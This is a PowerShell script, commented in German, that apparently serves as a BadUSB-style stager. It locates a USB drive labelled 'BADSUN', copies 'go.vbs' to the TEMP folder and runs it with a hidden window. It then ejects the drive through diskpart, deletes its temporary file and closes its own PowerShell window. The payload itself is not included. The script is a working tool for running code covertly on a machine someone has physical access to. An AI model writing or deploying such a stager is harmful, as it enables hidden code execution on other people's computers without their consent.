function Get-USBDriveLetter {
    $usbDrive = Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='BADSUN'" | Select-Object -First 1
    return $usbDrive.DriveLetter
}

# USB-Laufwerksbuchstaben ermitteln
$usbDriveLetter = Get-USBDriveLetter

if ($usbDriveLetter) {
    # Pfad zur VBScript-Datei auf dem USB-Laufwerk
    $usbScriptPath = Join-Path -Path $usbDriveLetter -ChildPath "go.vbs"
    
    # Pfad zum temporären Ordner
    $tempScriptPath = Join-Path -Path $env:TEMP -ChildPath "go.vbs"

    # Datei script.vbs in den temporären Ordner kopieren
    Copy-Item -Path $usbScriptPath -Destination $tempScriptPath -Force

    # VBScript im Hintergrund ausführen
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$tempScriptPath`"" -WindowStyle Hidden

    # Sound abspielen
    [System.Media.SystemSounds]::Beep.Play()

    # USB-Laufwerk sicher auswerfen
    $usbDriveLetter = $usbDriveLetter.TrimEnd(':')  # Entferne das ":" vom Laufwerksbuchstaben

    # Verwende Diskpart zum sicheren Entfernen des USB-Laufwerks
    $diskpartScript = @"
select volume $usbDriveLetter
remove
"@

    $diskpartScript | Out-File -FilePath "$env:TEMP\diskpartScript.txt" -Encoding ASCII
    Start-Process -FilePath "diskpart.exe" -ArgumentList "/s `"$env:TEMP\diskpartScript.txt`"" -Wait

    # Temporäre Datei entfernen
    Remove-Item -Path "$env:TEMP\diskpartScript.txt"

    # Ursprüngliches PowerShell-Fenster schließen
    Stop-Process -Id $PID
} else {
    Write-Host "USB-Laufwerk mit dem Namen 'BADSUN' wurde nicht gefunden."
}
